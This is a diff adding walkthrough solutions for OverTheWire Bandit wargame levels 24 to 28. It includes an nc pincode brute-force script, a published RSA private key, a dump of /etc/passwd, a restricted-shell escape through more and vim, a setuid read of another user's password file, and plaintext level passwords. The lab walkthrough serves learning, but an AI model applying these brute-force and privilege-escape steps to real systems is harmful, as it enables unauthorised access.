@@ -286,9 +286,9 @@ Problem:
 
 Solution:
 ```
-mkdir /tmp/<username>
-cp data.txt /tmp/<username>/data.txt
-cd /tmp/<username>/data.txt
+mkdir /tmp/<username12>
+cp data.txt /tmp/<username12>/data.txt
+cd /tmp/<username12>/data.txt
 
 # reverse hex dump
 xxd -r data.txt data
@@ -850,8 +850,8 @@ cd  /var/spool
 ls -l
 >>> drwxrwx-wx 40 root bandit24 4096 Sep  7 21:48 bandit24
 
-mkdir /tmp/<username>
-cd /tmp/<username>
+mkdir /tmp/<username23>
+cd /tmp/<username23>
 
 touch getPassword24.sh
 chmod +x getPassword24.sh
@@ -891,7 +891,309 @@ Problem:
 
 Solution:
 ```
-XXX
+nc localhost 30002
+>>> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+>>> Wrong! Please enter the correct pincode. Try again.
+
+mkdir /tmp/<username24>
+cd /tmp/<username24>
+
+touch getPassword25.sh
+chmod +x getPassword25.sh
+vim getPassword25.sh
+
+touch output.txt
+
+# write the following lines of code into getPassword25.sh 
+>>>
+#!/bin/bash
+
+password24="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for pin in {0000..9999}
+do
+    echo "$password24 $pin"
+done | nc localhost 30002 > output.txt
+
+cat output.txt | grep -v "Wrong"
+<<<
+
+./getPassword25.sh
+>>> 
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+Exiting.
+<<<
+```
+
+Output:
+```
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+
+## Level 25 → Level 26
+Connect:```ssh bandit25@bandit.labs.overthewire.org -p 2220```      
+Password:```uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG```
+
+Problem:
+- Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+Solution:
+```
+cat bandit26.sshkey
+>>>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+<<<
+```
+```
+# ON PERSONAL COMPUTER (not on bandit25 server)
+# create file with ssh private key
+vim level26-sshkey.private
+**copy RSA private key (output found from level 16) into this file, then exit file**
+chmod 600 level26-sshkey.private
+
+# login (it will kick us right back out)
+ssh bandit26@bandit.labs.overthewire.org -p 2220 -i level26-sshkey.private
+>>> Connection to bandit.labs.overthewire.org closed.
+```
+```
+# ON BANDIT25 SERVER
+cd /etc
+cat passwd
+>>>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+messagebus:x:101:104::/var/run/dbus:/bin/false
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+identd:x:103:65534::/var/run/identd:/bin/false
+ntp:x:104:107::/home/ntp:/bin/false
+bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash
+bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash
+bandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash
+bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash
+bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash
+bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash
+bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash
+bandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bash
+bandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bash
+bandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bash
+bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash
+bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash
+bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash
+bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash
+bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash
+bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash
+bandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bash
+bandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bash
+bandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bash
+bandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bash
+bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash
+bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash
+bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash
+bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash
+bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
+bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
+bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash
+bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash
+bandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bash
+bandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bash
+bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell
+bandit33:x:11033:11033:bandit level 33:/home/bandit33:/bin/bash
+bandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shell
+bandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shell
+bandit29-git:x:11529:11529::/home/bandit29-git:/usr/bin/git-shell
+bandit30-git:x:11530:11530::/home/bandit30-git:/usr/bin/git-shell
+bandit31-git:x:11531:11531::/home/bandit31-git:/usr/bin/git-shell
+<<<
+
+cat /usr/bin/showtext
+>>>
+#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0
+<<<
+```
+```
+# ON PERSONAL COMPUTER (not on bandit25 server)
+**make terminal as small as possible so that we can access the "more" command (make sure that not everything in ~/text.txt can fit on your terminal screen)**
+
+# open vim editor
+v
+
+# access the bandit26 password
+:e /etc/bandit_pass/bandit26
+>>> 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+# exit file
+:q
+
+# go back to vim
+v
+
+# set shell type
+:set shell=/bin/bash
+:shell
+```
+
+Output:
+```
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+
+
+## Level 26 → Level 27
+```
+# ON PERSONAL COMPUTER (not on bandit25 server)
+
+# create file with ssh private key
+vim level26-sshkey.private
+**copy RSA private key (output found from level 16) into this file, then exit file**
+chmod 600 level26-sshkey.private
+
+**make terminal as small as possible so that we can access the "more" command (make sure that not everything in ~/text.txt can fit on your terminal screen)**
+ssh bandit26@bandit.labs.overthewire.org -p 2220 -i level26-sshkey.private
+
+# open vim editor
+v
+
+# set shell type
+:set shell=/bin/bash
+:shell
+```
+
+Problem:
+- Good job getting a shell! Now hurry and grab the password for bandit27!
+
+Solution:
+```
+file bandit27-do
+>>> bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+
+./bandit27-do
+>>> Run a command as another user.
+>>> Example: ./bandit27-do id
+
+./bandit27-do id
+>>> uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
+
+# notice that owner of bandit27-do is bandit27 (and group is bandit26)
+ls -l
+-rwsr-x--- 1 bandit27 bandit26 7296 May  7 20:14 bandit27-do
+
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
+
+Output:
+```
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+
+## Level 27 → Level 28
+Connect:```ssh bandit27@bandit.labs.overthewire.org -p 2220```      
+Password:```3ba3118a22e93127a4ed485be72ef5ea```
+
+Problem:
+- There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.
+- Clone the repository and find the password for the next level.
+
+Solution:
+```
+mkdir /tmp/<username27>
+cd /tmp/<username27>
+
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+yes
+3ba3118a22e93127a4ed485be72ef5ea
+
+cd repo
+cat README
+```
+
+Output:
+```
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+```
+
+
+## Level 28 → Level 29
+Connect:```ssh bandit28@bandit.labs.overthewire.org -p 2220```      
+Password:```0ef186ac70e04ea33b4c1853d2526fa2```
+
+Problem:
+- There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.
+- Clone the repository and find the password for the next level.
+
+Solution:
+```
+mkdir /tmp/<username28>
+cd /tmp/<username28>
+
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+yes
+0ef186ac70e04ea33b4c1853d2526fa2
+
+cd repo
+cat README.md
+>>>
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+<<<
+
+
 ```
 
 Output:
